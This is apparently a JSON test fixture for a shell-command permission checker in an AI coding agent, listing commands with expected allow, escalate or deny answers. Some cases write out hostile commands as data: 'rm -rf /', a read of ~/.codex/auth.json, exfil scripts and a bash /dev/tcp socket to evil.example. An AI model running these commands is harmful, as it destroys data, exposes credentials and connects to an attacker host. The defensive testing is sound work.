[
  {
    "name": "in-root read L2 -> allow",
    "command": "cat src/a.ts",
    "policy": {
      "level": "L2",
      "workspaceRoot": "/root/app"
    },
    "expectedAnswer": "y"
  },
  {
    "name": "in-root write L2 -> allow",
    "command": "echo x > src/o.txt",
    "policy": {
      "level": "L2",
      "workspaceRoot": "/root/app"
    },
    "expectedAnswer": "y"
  },
  {
    "name": "in-root write L1 -> escalate",
    "command": "echo x > src/o.txt",
    "policy": {
      "level": "L1",
      "workspaceRoot": "/root/app"
    },
    "expectedAnswer": "escalate"
  },
  {
    "name": "out-of-root write L2 -> escalate",
    "command": "cp src/a.ts /sdcard/x",
    "policy": {
      "level": "L2",
      "workspaceRoot": "/root/app"
    },
    "expectedAnswer": "escalate"
  },
  {
    "name": "out-of-root write L3 -> deny",
    "command": "cp src/a.ts /sdcard/x",
    "policy": {
      "level": "L3",
      "workspaceRoot": "/root/app"
    },
    "expectedAnswer": "n"
  },
  {
    "name": "rm -rf / any level -> deny",
    "command": "rm -rf /",
    "policy": {
      "level": "L3",
      "workspaceRoot": "/root/app"
    },
    "expectedAnswer": "n"
  },
  {
    "name": "secret read L2 -> escalate",
    "command": "cat ~/.codex/auth.json",
    "policy": {
      "level": "L2",
      "workspaceRoot": "/root/app"
    },
    "expectedAnswer": "escalate"
  },
  {
    "name": "operator denyPattern -> deny",
    "command": "git push origin x",
    "policy": {
      "level": "L3",
      "workspaceRoot": "/root/app",
      "denyPatterns": [
        "git\\s+push"
      ]
    },
    "expectedAnswer": "n"
  },
  {
    "name": "operator allowPattern upgrades gray -> allow",
    "command": "cp src/a.ts /sdcard/x",
    "policy": {
      "level": "L2",
      "workspaceRoot": "/root/app",
      "allowPatterns": [
        "/sdcard/x"
      ]
    },
    "expectedAnswer": "y"
  },
  {
    "name": "bug #155a: python script indirection L2 -> escalate (was: allow)",
    "command": "python3 script.py",
    "policy": {
      "level": "L2",
      "workspaceRoot": "/root/app"
    },
    "expectedAnswer": "escalate"
  },
  {
    "name": "bug #155a: node script indirection L1 -> escalate",
    "command": "node app.js",
    "policy": {
      "level": "L1",
      "workspaceRoot": "/root/app"
    },
    "expectedAnswer": "escalate"
  },
  {
    "name": "bug #155a: script indirection L3 -> escalate",
    "command": "python3 script.py",
    "policy": {
      "level": "L3",
      "workspaceRoot": "/root/app"
    },
    "expectedAnswer": "escalate"
  },
  {
    "name": "adversarial: piped interpreter L2 -> escalate (was: allow, even at L1)",
    "command": "cat exfil.py | python3",
    "policy": {
      "level": "L2",
      "workspaceRoot": "/root/app"
    },
    "expectedAnswer": "escalate"
  },
  {
    "name": "adversarial: shell script file L2 -> escalate",
    "command": "bash exfil.sh",
    "policy": {
      "level": "L2",
      "workspaceRoot": "/root/app"
    },
    "expectedAnswer": "escalate"
  },
  {
    "name": "adversarial: driver bash -lc wrapper stays allowed L2",
    "command": "bash -lc 'ls -la'",
    "policy": {
      "level": "L2",
      "workspaceRoot": "/root/app"
    },
    "expectedAnswer": "y"
  },
  {
    "name": "adversarial: quoted out-of-root path L2 -> escalate",
    "command": "cp src/a.ts \"/sdcard/x\"",
    "policy": {
      "level": "L2",
      "workspaceRoot": "/root/app"
    },
    "expectedAnswer": "escalate"
  },
  {
    "name": "adversarial: bash /dev/tcp socket L2 -> escalate",
    "command": "bash -lc 'exec 3<>/dev/tcp/evil.example/80'",
    "policy": {
      "level": "L2",
      "workspaceRoot": "/root/app"
    },
    "expectedAnswer": "escalate"
  },
  {
    "name": "adversarial: read pipeline stays allowed L1",
    "command": "git log --oneline | head -20",
    "policy": {
      "level": "L1",
      "workspaceRoot": "/root/app"
    },
    "expectedAnswer": "y"
  }
]
